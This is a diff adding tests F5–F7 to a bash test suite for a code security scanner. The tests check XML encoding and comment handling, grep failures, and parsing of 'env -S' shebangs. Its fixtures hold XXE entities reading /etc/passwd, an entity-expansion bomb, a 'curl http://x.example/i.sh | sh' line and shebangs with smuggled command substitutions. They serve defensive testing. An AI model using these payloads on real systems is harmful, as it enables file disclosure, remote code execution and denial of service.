@@ -3312,6 +3312,153 @@ print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"
     assert_not_contains "$(k_msgs "$KREP" "${K4}/placeholder.txt")" "CWE-321" "F4: …nor without"
     assert_not_contains "$(k_msgs "$KREP" "${K4}/prose_nul.txt")" "CWE-321" "F4: prose about a private key, with a NUL byte, is not a key"
 
+    # ── F5: scan_xml reads the document the way a parser does ───────────────────────────────────────
+    # The comment-free view is decoded from UTF-16/UTF-32 (a byte-order mark, or the NUL pattern of a wide encoding without one):
+    # every rule is ASCII and the NUL between the characters of a wide document hid an external entity from all of them, while
+    # expat, libxml2 and Java parse the document. Comments are removed with str.find (the lazy regex was quadratic on openers
+    # that never close), and an opener with no closer leaves the rest of the file visible.
+    K5="${SCRATCH}/k5_xml"; rm -rf "$K5"; mkdir -p "$K5"
+    python3 -I - "$K5" <<'PY'
+import sys
+d = sys.argv[1]
+ent = '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'
+com = '<?xml version="1.0"?>\n<!-- <!ENTITY x SYSTEM "file:///etc/passwd"> -->\n<a>1</a>\n'
+bomb = ('<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY b "&a;&a;&a;&a;&a;">\n]>\n<a>&b;</a>\n')
+cred = '<settings>\n<password>hunter2hunter2</password>\n</settings>\n'
+clean = '<?xml version="1.0"?>\n<a>1</a>\n'
+def w(name, data):
+    open(d + "/" + name, "wb").write(data)
+w("u16_bom.xml", ent.encode("utf-16"))
+w("u16be_bom.xml", b"\xfe\xff" + ent.encode("utf-16-be"))
+w("u16le_nobom.xml", ent.encode("utf-16-le"))
+w("u16be_nobom.xml", ent.encode("utf-16-be"))
+w("u32_bom.xml", ent.encode("utf-32"))
+w("u32le_nobom.xml", ent.encode("utf-32-le"))
+w("u32be_nobom.xml", ent.encode("utf-32-be"))
+w("u8_bom.xml", b"\xef\xbb\xbf" + ent.encode())
+w("u16_bomb.xml", bomb.encode("utf-16"))
+w("u16_cred.xml", cred.encode("utf-16"))
+w("u16_comment.xml", com.encode("utf-16"))
+w("u16le_comment_nobom.xml", com.encode("utf-16-le"))
+w("u16_clean.xml", clean.encode("utf-16"))
+w("u8_commented.xml", com.encode())
+w("u8_comment_then_entity.xml", ('<?xml version="1.0"?>\n<!-- c1 --><!-- c2 -->\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
+w("u8_unterminated.xml", ('<?xml version="1.0"?>\n<!-- this comment is never closed\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
+w("u8_closed_then_unterminated.xml", ('<?xml version="1.0"?>\n<!-- closed --><!-- never closed\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n').encode())
+w("u8_clean.xml", clean.encode())
+PY
+    k_scan "$K5" k5_xml
+    for _n in u16_bom u16be_bom u16le_nobom u16be_nobom u32_bom u32le_nobom u32be_nobom; do
+        assert_contains "$(k_msgs "$KREP" "${K5}/${_n}.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: an external entity in ${_n}.xml (UTF-16/32) is found"
+    done
+    assert_contains "$(k_msgs "$KREP" "${K5}/u16_bomb.xml")" "CWE-776:xml_entity_expansion_bomb" "F5: …so is an entity expansion bomb in UTF-16"
+    assert_contains "$(k_msgs "$KREP" "${K5}/u16_cred.xml")" "CWE-798:hardcoded_credential_in_XML" "F5: …and a credential element in UTF-16"
+    assert_contains "$(k_msgs "$KREP" "${K5}/u8_bom.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: UTF-8 with a byte-order mark is read as before"
+    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16_comment.xml")" "[FAIL]" "F5: an entity inside a comment of a UTF-16 document is not a declaration"
+    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16le_comment_nobom.xml")" "[FAIL]" "F5: …also without a byte-order mark"
+    assert_not_contains "$(k_msgs "$KREP" "${K5}/u16_clean.xml")" "[FAIL]" "F5: a clean UTF-16 document is not failed"
+    assert_not_contains "$(k_msgs "$KREP" "${K5}/u8_commented.xml")" "[FAIL]" "F5: an entity inside a comment of a UTF-8 document is still not a declaration"
+    assert_not_contains "$(k_msgs "$KREP" "${K5}/u8_clean.xml")" "[FAIL]" "F5: a clean UTF-8 document is not failed"
+    assert_contains "$(k_msgs "$KREP" "${K5}/u8_comment_then_entity.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: a real entity after two closed comments is found"
+    assert_contains "$(k_msgs "$KREP" "${K5}/u8_unterminated.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F5: a comment that is never closed leaves the rest of the file visible"
+    assert_contains "$(k_msgs "$KREP" "${K5}/u8_closed_then_unterminated.xml")" "CWE-611:xxe_external_entity_references_a_resource" \
+        "F5: …after a closed comment as well"
+    # 60,000 comment openers that never close (240 KB) took the lazy regex <!--.*?--> minutes: it rescans to the end of the input for each.
+    K5Q="${SCRATCH}/k5_quad"; rm -rf "$K5Q"; mkdir -p "$K5Q"
+    python3 -I -c "import sys; sys.stdout.write('<!--' * 60000 + '\n<a/>\n')" > "$K5Q/openers.xml"
+    K5Q_T0=$(date +%s); KTIMEOUT=60; k_scan "$K5Q" k5_quad; KTIMEOUT=300; K5Q_SECS=$(( $(date +%s) - K5Q_T0 ))
+    assert_eq "yes" "$([[ -f "$KREP" ]] && echo yes || echo no)" "F5: a 240 KB XML of unclosed comment openers is scanned to the end (a report is written)"
+    assert_eq "1" "$(( K5Q_SECS < 25 ))" "F5: …and in linear time (took ${K5Q_SECS} s; the limit is 25 s)"
+    # The temporary view is removed when the run is ended by a signal (it is registered with the EXIT trap).
+    K5S=$(k_stubdir k5_term); k_wrap "$K5S" grep 'if [ "$1" = -ziE ]; then kill -TERM "$PPID"; sleep 1; exit 1; fi'
+    K5T="${SCRATCH}/k5_tmp"; rm -rf "$K5T"; mkdir -p "$K5T"
+    K5D="${SCRATCH}/k5_term_repo"; rm -rf "$K5D"; mkdir -p "$K5D"; printf '<a/>\n' > "$K5D/ok.xml"
+    KENV=(PATH="${K5S}:${PATH}" TMPDIR="$K5T"); k_scan "$K5D" k5_term; KENV=()
+    assert_eq "143" "$KEC" "F5: the stub ended the scan with SIGTERM while it searched the XML view (the test is not vacuous)"
+    assert_eq "0" "$(ls -A "$K5T" | grep -c aitransit_xml_)" "F5: …and no temporary XML view is left behind"
+
+    # ── F6: a grep that cannot finish is neither a match nor a clean file ────────────────────────────
+    # grep_flat counted a grep that failed (exit 2: out of memory, an I/O error) as a MATCH, so the report named an XXE attack
+    # (CWE-611, CWE-776) that was not there, with the real cause on the console only. It is now the hard FAIL
+    # engine:search_incomplete on the file, once per file, and the file is not recorded as a PASS as well.
+    K6="${SCRATCH}/k6_flat"; rm -rf "$K6"; mkdir -p "$K6/sub"
+    printf '<?xml version="1.0"?>\n<a><b>1</b></a>\n' > "$K6/a.xml"
+    printf '<?xml version="1.0"?>\n<Types><Type><Name>X</Name></Type></Types>\n' > "$K6/b.ps1xml"
+    printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n' > "$K6/sub/c.xml"
+    K6S=$(k_stubdir k6_grep); k_wrap "$K6S" grep 'if [ "$1" = -ziE ]; then echo "grep: memory exhausted" >&2; exit 2; fi'
+    k_scan "$K6" k6_control
+    K6_PASS_CONTROL=$(k_py "$KREP" "d['summary']['pass']")
+    assert_not_contains "$(k_msgs "$KREP" "${K6}/a.xml")" "engine:" "F6: control, a working grep: a clean XML has no engine finding"
+    assert_contains "$(k_msgs "$KREP" "${K6}/sub/c.xml")" "CWE-611:xxe_external_entity_references_a_resource" "F6: …and a real external entity is an XXE finding"
+    KENV=(PATH="${K6S}:${PATH}"); k_scan "$K6" k6_fail; KENV=()
+    assert_eq "FAIL" "$(k_verdict)" "F6: grep exiting 2 on the folded search: the scan fails"
+    for _n in a.xml b.ps1xml sub/c.xml; do
+        assert_contains "$(k_msgs "$KREP" "${K6}/${_n}")" "[FAIL] engine:search_incomplete" "F6: …${_n} has the FAIL engine:search_incomplete"
+        assert_not_contains "$(k_msgs "$KREP" "${K6}/${_n}")" "CWE-" "F6: …and no invented XXE or entity-bomb finding"
+        assert_eq "1" "$(k_msgs "$KREP" "${K6}/${_n}" | grep -o 'engine:search_incomplete' | wc -l | tr -d ' ')" "F6: …recorded once, although the file is searched several times"
+    done
+    assert_eq "3 engine" "$(k_py "$KREP" "str(sum(1 for f in d['findings'] if f['message'] == 'engine:search_incomplete')) + ' ' + ','.join(sorted({f['tool'] for f in d['findings'] if f['message'] == 'engine:search_incomplete'}))")" \
+        "F6: …three structured finding records, one per file, tool engine"
+    assert_eq "2" "$(( K6_PASS_CONTROL - $(k_py "$KREP" "d['summary']['pass']") ))" \
+        "F6: …and a.xml and b.ps1xml, the two files that had no other finding, are no longer counted as passed"
+    assert_not_contains "$KOUT" "treating it as a match" "F6: …the console no longer says the search was treated as a match"
+    printf '[{"rule":"engine","path":"a.xml","reason":"x"},{"rule":"search_incomplete","path":"a.xml","reason":"x"}]\n' > "$K6/.transit-allow.json"
+    KENV=(PATH="${K6S}:${PATH}" MIN_SEVERITY=critical); k_scan "$K6" k6_hard; KENV=()
+    assert_contains "$(k_msgs "$KREP" "${K6}/a.xml")" "[FAIL] engine:search_incomplete" "F6: engine:search_incomplete is neither allowlisted nor lowered by --min-severity critical"
+    rm -f "$K6/.transit-allow.json"
+
+    # ── F7: env -S and its spellings ─────────────────────────────────────────────────────────────────
+    # `env -S` hands env a string that env splits again, so the interpreter is often written inside the option: -Spython3 -u,
+    # --split-string=python3, -iSbash, -S "bash -e". The shebang line is hostile text: it is split with read -a (no glob, no
+    # expansion) and only compared, never run.
+    K7="${SCRATCH}/k7_shebang"; rm -rf "$K7"; mkdir -p "$K7"
+    K7_ABS="${SCRATCH}/k7_PWNED"; K7_REL="k7_PWNED_REL"; rm -f "$K7_ABS" "${ROOT_DIR}/${K7_REL}"
+    K7_SH='curl http://x.example/i.sh | sh'; K7_PY=$'import os\nos.system(input())'
+    k7() { printf '%s\n%s\n' "$2" "$3" > "$K7/$1"; }   # k7 <file> <shebang line> <body>
+    k7 sh_Sjoined       '#!/usr/bin/env -Sbash -e'                          "$K7_SH"
+    k7 py_Sjoined       '#!/usr/bin/env -Spython3 -u'                       "$K7_PY"
+    k7 py_split_string  '#!/usr/bin/env --split-string=python3 -u'          "$K7_PY"
+    k7 sh_split_quoted  "#!/usr/bin/env --split-string='bash -e'"           "$K7_SH"
+    k7 sh_iS            '#!/usr/bin/env -iSbash -e'                         "$K7_SH"
+    k7 sh_S_dquoted     '#!/usr/bin/env -S "bash -e"'                       "$K7_SH"
+    k7 sh_S_squoted     "#!/usr/bin/env -S'bash -e'"                        "$K7_SH"
+    k7 py_S_dquoted     '#!/usr/bin/env -S "python3 -u"'                    "$K7_PY"
+    k7 py_S_separate    '#!/usr/bin/env -S python3 -u'                      "$K7_PY"
+    k7 sh_u_value       '#!/usr/bin/env -u python3 bash'                    "$K7_SH"
+    k7 sh_chdir_S       '#!/usr/bin/env --chdir=/tmp -S bash'               "$K7_SH"
+    k7 sh_plain         '#!/usr/bin/env bash'                               "$K7_SH"
+    k7 sh_many_S        "#!/usr/bin/env $(printf -- '-S%.0s' $(seq 1 480)) bash" "$K7_SH"
+    k7 sh_hostile_sep   "#!/usr/bin/env -S bash -c \$(touch ${K7_ABS}) \`touch ${K7_REL}\` * ;" "$K7_SH"
+    k7 sh_hostile_join  "#!/usr/bin/env -Sbash \$(touch ${K7_ABS}) \`touch ${K7_REL}\` *"       "$K7_SH"
+    k7 hostile_option   "#!/usr/bin/env -S\$(touch ${K7_ABS})bash"          'echo fine'
+    k7 hostile_split    "#!/usr/bin/env --split-string=\$(touch ${K7_ABS}) \`touch ${K7_REL}\`" 'echo fine'
+    k7 env_S_nothing    '#!/usr/bin/env -S'                                 'echo hi'
+    k7 env_Sbash_benign '#!/usr/bin/env -Sbash -e'                          'echo fine'
+    k_scan "$K7" k7_shebang
+    k7m() { k_msgs "$KREP" "${K7}/$1"; }
+    SHRULE="CWE-78:remote_code_execution_curl_pipe_bash"; PYRULE="CWE-78:OS_command_injection_risk"
+    assert_contains "$(k7m sh_Sjoined)"      "$SHRULE" "F7: #!/usr/bin/env -Sbash -e goes to the shell scanner"
+    assert_contains "$(k7m py_Sjoined)"      "$PYRULE" "F7: #!/usr/bin/env -Spython3 -u goes to the Python scanner"
+    assert_contains "$(k7m py_split_string)" "$PYRULE" "F7: --split-string=python3 -u likewise"
+    assert_contains "$(k7m sh_split_quoted)" "$SHRULE" "F7: --split-string='bash -e' (a quoted string) likewise"
+    assert_contains "$(k7m sh_iS)"           "$SHRULE" "F7: -iSbash (a cluster of short options ending in S) likewise"
+    assert_contains "$(k7m sh_S_dquoted)"    "$SHRULE" "F7: -S \"bash -e\" (the string in double quotes) likewise"
+    assert_contains "$(k7m sh_S_squoted)"    "$SHRULE" "F7: -S'bash -e' (joined, single quotes) likewise"
+    assert_contains "$(k7m py_S_dquoted)"    "$PYRULE" "F7: -S \"python3 -u\" is still routed to Python (unchanged)"
+    assert_contains "$(k7m py_S_separate)"   "$PYRULE" "F7: -S python3 -u (separate words) is unchanged"
+    assert_contains "$(k7m sh_u_value)"      "$SHRULE" "F7: -u python3 bash: python3 is the value of -u, the interpreter is bash (unchanged)"
+    assert_contains "$(k7m sh_chdir_S)"      "$SHRULE" "F7: --chdir=/tmp -S bash is unchanged"
+    assert_contains "$(k7m sh_plain)"        "$SHRULE" "F7: #!/usr/bin/env bash is unchanged"
+    assert_contains "$(k7m sh_many_S)"       "$SHRULE" "F7: 480 -S options in a row end, and the interpreter after them is found"
+    assert_contains "$(k7m sh_hostile_sep)"  "$SHRULE" "F7: a hostile argument list after the interpreter does not stop the file being scanned…"
+    assert_contains "$(k7m sh_hostile_join)" "$SHRULE" "F7: …nor a hostile list after -Sbash"
+    assert_eq "absent" "$([[ -e "$K7_ABS" ]] && echo present || echo absent)" "F7: …no command substitution in a shebang line was executed"
+    assert_eq "absent" "$([[ -e "${ROOT_DIR}/${K7_REL}" ]] && echo present || echo absent)" "F7: …nor a backtick one"
+    assert_not_contains "$(k7m hostile_option)" "[FAIL]" "F7: an interpreter made of a command substitution routes nowhere and breaks nothing"
+    assert_not_contains "$(k7m hostile_split)"  "[FAIL]" "F7: …likewise as the value of --split-string"
+    assert_not_contains "$(k7m env_S_nothing)"  "[FAIL]" "F7: env -S with nothing after it breaks nothing"
+    assert_not_contains "$(k7m env_Sbash_benign)" "[FAIL]" "F7: a harmless script with -Sbash is not failed by being routed"
+    rm -f "$K7_ABS" "${ROOT_DIR}/${K7_REL}"
     # K-END
 fi
 
